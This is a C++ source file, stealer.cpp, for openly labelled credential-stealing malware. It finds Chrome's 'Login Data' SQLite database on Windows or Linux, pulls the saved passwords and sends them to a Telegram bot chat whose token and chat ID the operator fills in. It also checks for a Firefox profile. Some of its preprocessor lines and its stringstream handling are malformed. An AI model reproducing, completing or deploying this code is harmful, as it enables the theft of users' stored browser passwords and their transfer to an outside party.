//============================================================================
// Name        : stealer.cpp
// Author      : Hleb Hatouka
// Description : stealer in C++
//============================================================================

#include "sender.h"
#include <experimental/filesystem>
#include <iostream>
#include <string>
#include <sstream>
#include <exception>

#include <csignal>
#include <cstdio>
#include <cstdlib>

#include "sqlite3.h"

#ifdef _WIN32
    #include "windows/tools.h"
    
    #ifndef UNICODE  
        typedef std::string String; 
    #else
        typedef std::wstring String; 
    #endif
#else __linux__
    #include "linux/tools.h"
#endif

namespace fs = std::experimental::filesystem;

int main()
{
    try
    {
        sqlite3 *db;

        const std::string TOKEN(""); //put your bot token here
        const long ID = long(); // set your chat id here

        TgBot::Bot bot(TOKEN);

        Sender bot_sender(bot);

#ifdef __linux__
        std::string chrome_db_path = "~/.config/google-chrome/Default";
        std::string firefox_db_path = "~/.mozilla/firefox/<profilename>";

#else _WIN32
        TCHAR username[255];
        DWORD username_len = 255;
        GetUserName((TCHAR*)username, &username_len);

        String chrome_db_path = _T("C:\\Users\\");
        chrome_db_path += username;
        chrome_db_path += _T("\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data");

        String firefox_db_path = _T("C:\\Users\\");
        firefox_db_path += username;
        firefox_db_path += _T("\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\");
#endif

        if( fs::exists(chrome_db_path))
        {
            std::stringstream pass;
            
            int rc = sqlite3_open(chrome_db_path.c_str(), &db);
            if( rc )
            {
                std::cout << "DB Error: " << sqlite3_errmsg(db) << std::endl;
                sqlite3_close(db);
                return 1;
            }
            pass = get_chrome_pass(db);
            bot_sender.send(ID, pass.str());
            
            //rc = sqlite3_exec(db, sql.c_str(), callback1, 0, &zErrMsg);
        }

        if( fs::exists(firefox_db_path))
        {
            std::cout << "ff exists" << std::endl;
            //bot_sender.send(ID, "ff exists");
        }
    }
    catch(std::exception &e)
    {
        std::cerr << e.what();
    }

    return 0;
}